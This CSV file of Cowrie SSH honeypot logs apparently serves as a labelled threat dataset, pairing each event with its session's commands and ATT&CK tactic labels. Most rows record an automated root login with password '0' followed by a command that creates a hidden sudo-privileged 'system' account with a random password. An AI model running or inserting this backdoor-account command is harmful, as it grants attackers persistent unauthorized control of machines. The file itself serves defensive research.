,event,session_id,session,labels
279,"{""duplicate"": false, ""duration"": ""0.1"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/6b06038463ac80097d2d2e7d479db87734b3004bc4116bf4499f97a753dc5d1a after 0.1 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""shasum"": ""6b06038463ac80097d2d2e7d479db87734b3004bc4116bf4499f97a753dc5d1a"", ""size"": 154.0, ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-09T09:22:13.762157Z"", ""ttylog"": ""var/lib/cowrie/tty/6b06038463ac80097d2d2e7d479db87734b3004bc4116bf4499f97a753dc5d1a"", ""session_id"": ""9ac6e9a18a9a""}",9ac6e9a18a9a,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 AQmyRAYb) system  && sudo usermod -aG sudo system ; openssl passwd -1 AQmyRAYb;,"['Discovery', 'Impact', 'Initial Access', 'Command and Control']"
280,"{""duration"": ""0.9"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 0.9 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-09T09:22:13.762950Z"", ""session_id"": ""9ac6e9a18a9a""}",9ac6e9a18a9a,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 AQmyRAYb) system  && sudo usermod -aG sudo system ; openssl passwd -1 AQmyRAYb;,"['Discovery', 'Impact', 'Initial Access', 'Command and Control']"
281,"{""dst_ip"": ""10.42.4.33"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.4.1:63008 (10.42.4.33:2222) [session: f01929aa2481]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""src_port"": 63008.0, ""timestamp"": ""2025-08-09T11:34:35.402992Z"", ""session_id"": ""f01929aa2481""}",f01929aa2481,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 aea2CVTv) system  && sudo usermod -aG sudo system ; openssl passwd -1 aea2CVTv;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
282,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-09T11:34:35.403692Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""f01929aa2481""}",f01929aa2481,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 aea2CVTv) system  && sudo usermod -aG sudo system ; openssl passwd -1 aea2CVTv;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
283,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""4e066189c3bbeec38c99b1855113733a"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-09T11:34:35.507060Z"", ""session_id"": ""f01929aa2481""}",f01929aa2481,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 aea2CVTv) system  && sudo usermod -aG sudo system ; openssl passwd -1 aea2CVTv;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
284,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-09T11:34:35.820147Z"", ""username"": ""root"", ""session_id"": ""f01929aa2481""}",f01929aa2481,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 aea2CVTv) system  && sudo usermod -aG sudo system ; openssl passwd -1 aea2CVTv;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
285,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-09T11:34:36.050918Z"", ""session_id"": ""f01929aa2481""}",f01929aa2481,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 aea2CVTv) system  && sudo usermod -aG sudo system ; openssl passwd -1 aea2CVTv;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
286,"{""eventid"": ""cowrie.command.input"", ""input"": ""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 aea2CVTv) system && sudo usermod -aG sudo system"", ""message"": ""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 aea2CVTv) system && sudo usermod -aG sudo system"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-09T11:34:36.051357Z"", ""session_id"": ""f01929aa2481""}",f01929aa2481,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 aea2CVTv) system  && sudo usermod -aG sudo system ; openssl passwd -1 aea2CVTv;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
287,"{""eventid"": ""cowrie.command.input"", ""input"": ""openssl passwd -1 aea2CVTv"", ""message"": ""CMD: openssl passwd -1 aea2CVTv"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-09T11:34:36.051880Z"", ""session_id"": ""f01929aa2481""}",f01929aa2481,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 aea2CVTv) system  && sudo usermod -aG sudo system ; openssl passwd -1 aea2CVTv;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
288,"{""eventid"": ""cowrie.command.failed"", ""input"": ""openssl passwd -1 aea2CVTv"", ""message"": ""Command not found: openssl passwd -1 aea2CVTv"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-09T11:34:36.052563Z"", ""session_id"": ""f01929aa2481""}",f01929aa2481,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 aea2CVTv) system  && sudo usermod -aG sudo system ; openssl passwd -1 aea2CVTv;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
289,"{""duplicate"": false, ""duration"": ""0.1"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/88fb5b7478c53cd036b5792ac81506a440af6e84e1b9afad893982910745fa0a after 0.1 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""shasum"": ""88fb5b7478c53cd036b5792ac81506a440af6e84e1b9afad893982910745fa0a"", ""size"": 154.0, ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-09T11:34:36.157672Z"", ""ttylog"": ""var/lib/cowrie/tty/88fb5b7478c53cd036b5792ac81506a440af6e84e1b9afad893982910745fa0a"", ""session_id"": ""f01929aa2481""}",f01929aa2481,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 aea2CVTv) system  && sudo usermod -aG sudo system ; openssl passwd -1 aea2CVTv;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
290,"{""duration"": ""0.8"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 0.8 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-09T11:34:36.158465Z"", ""session_id"": ""f01929aa2481""}",f01929aa2481,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 aea2CVTv) system  && sudo usermod -aG sudo system ; openssl passwd -1 aea2CVTv;,"['Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
291,"{""dst_ip"": ""10.42.4.33"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.4.1:44014 (10.42.4.33:2222) [session: 30d46235f098]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""src_port"": 44014.0, ""timestamp"": ""2025-08-14T04:41:03.797245Z"", ""session_id"": ""30d46235f098""}",30d46235f098,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 zm2NM3Cs) system  && sudo usermod -aG sudo system ; openssl passwd -1 zm2NM3Cs;,"['Discovery', 'Impact', 'Initial Access', 'Command and Control']"
292,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-14T04:41:03.797659Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""30d46235f098""}",30d46235f098,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 zm2NM3Cs) system  && sudo usermod -aG sudo system ; openssl passwd -1 zm2NM3Cs;,"['Discovery', 'Impact', 'Initial Access', 'Command and Control']"
293,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""4e066189c3bbeec38c99b1855113733a"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-14T04:41:03.901238Z"", ""session_id"": ""30d46235f098""}",30d46235f098,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 zm2NM3Cs) system  && sudo usermod -aG sudo system ; openssl passwd -1 zm2NM3Cs;,"['Discovery', 'Impact', 'Initial Access', 'Command and Control']"
294,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-14T04:41:04.214137Z"", ""username"": ""root"", ""session_id"": ""30d46235f098""}",30d46235f098,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 zm2NM3Cs) system  && sudo usermod -aG sudo system ; openssl passwd -1 zm2NM3Cs;,"['Discovery', 'Impact', 'Initial Access', 'Command and Control']"
295,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-14T04:41:04.439000Z"", ""session_id"": ""30d46235f098""}",30d46235f098,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 zm2NM3Cs) system  && sudo usermod -aG sudo system ; openssl passwd -1 zm2NM3Cs;,"['Discovery', 'Impact', 'Initial Access', 'Command and Control']"
296,"{""eventid"": ""cowrie.command.input"", ""input"": ""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 zm2NM3Cs) system && sudo usermod -aG sudo system"", ""message"": ""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 zm2NM3Cs) system && sudo usermod -aG sudo system"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-14T04:41:04.439354Z"", ""session_id"": ""30d46235f098""}",30d46235f098,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 zm2NM3Cs) system  && sudo usermod -aG sudo system ; openssl passwd -1 zm2NM3Cs;,"['Discovery', 'Impact', 'Initial Access', 'Command and Control']"
297,"{""eventid"": ""cowrie.command.input"", ""input"": ""openssl passwd -1 zm2NM3Cs"", ""message"": ""CMD: openssl passwd -1 zm2NM3Cs"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-14T04:41:04.440001Z"", ""session_id"": ""30d46235f098""}",30d46235f098,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 zm2NM3Cs) system  && sudo usermod -aG sudo system ; openssl passwd -1 zm2NM3Cs;,"['Discovery', 'Impact', 'Initial Access', 'Command and Control']"
298,"{""eventid"": ""cowrie.command.failed"", ""input"": ""openssl passwd -1 zm2NM3Cs"", ""message"": ""Command not found: openssl passwd -1 zm2NM3Cs"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-14T04:41:04.440601Z"", ""session_id"": ""30d46235f098""}",30d46235f098,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 zm2NM3Cs) system  && sudo usermod -aG sudo system ; openssl passwd -1 zm2NM3Cs;,"['Discovery', 'Impact', 'Initial Access', 'Command and Control']"
299,"{""duplicate"": false, ""duration"": ""0.1"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/545e90bcf954b1d2023d801cc9fa6524178bc27fe2647b3e72409bdcbd8c594b after 0.1 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""shasum"": ""545e90bcf954b1d2023d801cc9fa6524178bc27fe2647b3e72409bdcbd8c594b"", ""size"": 154.0, ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-14T04:41:04.545557Z"", ""ttylog"": ""var/lib/cowrie/tty/545e90bcf954b1d2023d801cc9fa6524178bc27fe2647b3e72409bdcbd8c594b"", ""session_id"": ""30d46235f098""}",30d46235f098,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 zm2NM3Cs) system  && sudo usermod -aG sudo system ; openssl passwd -1 zm2NM3Cs;,"['Discovery', 'Impact', 'Initial Access', 'Command and Control']"
300,"{""duration"": ""0.7"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 0.7 seconds"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-14T04:41:04.546096Z"", ""session_id"": ""30d46235f098""}",30d46235f098,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 zm2NM3Cs) system  && sudo usermod -aG sudo system ; openssl passwd -1 zm2NM3Cs;,"['Discovery', 'Impact', 'Initial Access', 'Command and Control']"
301,"{""dst_ip"": ""10.42.6.15"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.6.1:62318 (10.42.6.15:2222) [session: dd635547a91a]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""src_port"": 62318.0, ""timestamp"": ""2025-08-11T22:38:23.787839Z"", ""session_id"": ""dd635547a91a""}",dd635547a91a,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 jtKtXVCu) system  && sudo usermod -aG sudo system ; openssl passwd -1 jtKtXVCu;,"['Impact', 'Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
302,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-11T22:38:23.789341Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""dd635547a91a""}",dd635547a91a,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 jtKtXVCu) system  && sudo usermod -aG sudo system ; openssl passwd -1 jtKtXVCu;,"['Impact', 'Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
303,"{""compCS"": [""none""], ""encCS"": [""aes128-gcm@openssh.com"", ""chacha20-poly1305@openssh.com"", ""aes128-ctr"", ""aes192-ctr"", ""aes256-ctr""], ""eventid"": ""cowrie.client.kex"", ""hash"": ""4e066189c3bbeec38c99b1855113733a"", ""hashAlgorithms"": ""curve25519-sha256,curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group14-sha256,diffie-hellman-group14-sha1,ext-info-c;aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes128-ctr,aes192-ctr,aes256-ctr;hmac-sha2-256-etm@openssh.com,hmac-sha2-256,hmac-sha1,hmac-sha1-96;none"", ""kexAlgs"": [""curve25519-sha256"", ""curve25519-sha256@libssh.org"", ""ecdh-sha2-nistp256"", ""ecdh-sha2-nistp384"", ""ecdh-sha2-nistp521"", ""diffie-hellman-group14-sha256"", ""diffie-hellman-group14-sha1"", ""ext-info-c""], ""keyAlgs"": [""rsa-sha2-512-cert-v01@openssh.com"", ""rsa-sha2-256-cert-v01@openssh.com"", ""ssh-rsa-cert-v01@openssh.com"", ""ssh-dss-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256-cert-v01@openssh.com"", ""ecdsa-sha2-nistp384-cert-v01@openssh.com"", ""ecdsa-sha2-nistp521-cert-v01@openssh.com"", ""ssh-ed25519-cert-v01@openssh.com"", ""ecdsa-sha2-nistp256"", ""ecdsa-sha2-nistp384"", ""ecdsa-sha2-nistp521"", ""rsa-sha2-512"", ""rsa-sha2-256"", ""ssh-rsa"", ""ssh-dss"", ""ssh-ed25519""], ""langCS"": [""""], ""macCS"": [""hmac-sha2-256-etm@openssh.com"", ""hmac-sha2-256"", ""hmac-sha1"", ""hmac-sha1-96""], ""message"": ""SSH client hassh fingerprint: 4e066189c3bbeec38c99b1855113733a"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-11T22:38:23.801939Z"", ""session_id"": ""dd635547a91a""}",dd635547a91a,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 jtKtXVCu) system  && sudo usermod -aG sudo system ; openssl passwd -1 jtKtXVCu;,"['Impact', 'Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
304,"{""eventid"": ""cowrie.login.success"", ""message"": ""login attempt [root/0] succeeded"", ""password"": ""0"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-11T22:38:23.846008Z"", ""username"": ""root"", ""session_id"": ""dd635547a91a""}",dd635547a91a,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 jtKtXVCu) system  && sudo usermod -aG sudo system ; openssl passwd -1 jtKtXVCu;,"['Impact', 'Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
305,"{""arch"": ""linux-x64-lsb"", ""eventid"": ""cowrie.session.params"", ""message"": ""[]"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-11T22:38:24.291066Z"", ""session_id"": ""dd635547a91a""}",dd635547a91a,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 jtKtXVCu) system  && sudo usermod -aG sudo system ; openssl passwd -1 jtKtXVCu;,"['Impact', 'Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
306,"{""eventid"": ""cowrie.command.input"", ""input"": ""apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 jtKtXVCu) system && sudo usermod -aG sudo system"", ""message"": ""CMD: apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 jtKtXVCu) system && sudo usermod -aG sudo system"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-11T22:38:24.291844Z"", ""session_id"": ""dd635547a91a""}",dd635547a91a,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 jtKtXVCu) system  && sudo usermod -aG sudo system ; openssl passwd -1 jtKtXVCu;,"['Impact', 'Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
307,"{""eventid"": ""cowrie.command.input"", ""input"": ""openssl passwd -1 jtKtXVCu"", ""message"": ""CMD: openssl passwd -1 jtKtXVCu"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-11T22:38:24.292582Z"", ""session_id"": ""dd635547a91a""}",dd635547a91a,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 jtKtXVCu) system  && sudo usermod -aG sudo system ; openssl passwd -1 jtKtXVCu;,"['Impact', 'Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
308,"{""eventid"": ""cowrie.command.failed"", ""input"": ""openssl passwd -1 jtKtXVCu"", ""message"": ""Command not found: openssl passwd -1 jtKtXVCu"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-11T22:38:24.293727Z"", ""session_id"": ""dd635547a91a""}",dd635547a91a,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 jtKtXVCu) system  && sudo usermod -aG sudo system ; openssl passwd -1 jtKtXVCu;,"['Impact', 'Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
309,"{""duplicate"": false, ""duration"": ""0.0"", ""eventid"": ""cowrie.log.closed"", ""message"": ""Closing TTY Log: var/lib/cowrie/tty/11baa6946ea38a5b40eee861a3059632c1fb70b007198fa93ba90d64f4c2e098 after 0.0 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""shasum"": ""11baa6946ea38a5b40eee861a3059632c1fb70b007198fa93ba90d64f4c2e098"", ""size"": 154.0, ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-11T22:38:24.307989Z"", ""ttylog"": ""var/lib/cowrie/tty/11baa6946ea38a5b40eee861a3059632c1fb70b007198fa93ba90d64f4c2e098"", ""session_id"": ""dd635547a91a""}",dd635547a91a,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 jtKtXVCu) system  && sudo usermod -aG sudo system ; openssl passwd -1 jtKtXVCu;,"['Impact', 'Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
310,"{""duration"": ""0.5"", ""eventid"": ""cowrie.session.closed"", ""message"": ""Connection lost after 0.5 seconds"", ""sensor"": ""cowrie-poli-worker-01-89bfdd5dd-v7wvn"", ""src_ip"": ""10.42.6.1"", ""timestamp"": ""2025-08-11T22:38:24.310847Z"", ""session_id"": ""dd635547a91a""}",dd635547a91a,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 jtKtXVCu) system  && sudo usermod -aG sudo system ; openssl passwd -1 jtKtXVCu;,"['Impact', 'Discovery', 'Persistence', 'Initial Access', 'Command and Control']"
311,"{""dst_ip"": ""10.42.4.33"", ""dst_port"": 2222.0, ""eventid"": ""cowrie.session.connect"", ""message"": ""New connection: 10.42.4.1:41378 (10.42.4.33:2222) [session: d8dea56252e1]"", ""protocol"": ""ssh"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""src_port"": 41378.0, ""timestamp"": ""2025-08-06T10:43:15.714040Z"", ""session_id"": ""d8dea56252e1""}",d8dea56252e1,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 vyTXQNKs) system  && sudo usermod -aG sudo system ; openssl passwd -1 vyTXQNKs;,"['Discovery', 'Impact', 'Initial Access', 'Command and Control']"
312,"{""eventid"": ""cowrie.client.version"", ""message"": ""Remote SSH version: SSH-2.0-Go"", ""sensor"": ""cowrie-azure-worker-00-8ff84698d-4226n"", ""src_ip"": ""10.42.4.1"", ""timestamp"": ""2025-08-06T10:43:15.714483Z"", ""version"": ""SSH-2.0-Go"", ""session_id"": ""d8dea56252e1""}",d8dea56252e1,apt update  && apt install sudo curl -y  && sudo useradd -m -p $(openssl passwd -1 vyTXQNKs) system  && sudo usermod -aG sudo system ; openssl passwd -1 vyTXQNKs;,"['Discovery', 'Impact', 'Initial Access', 'Command and Control']"
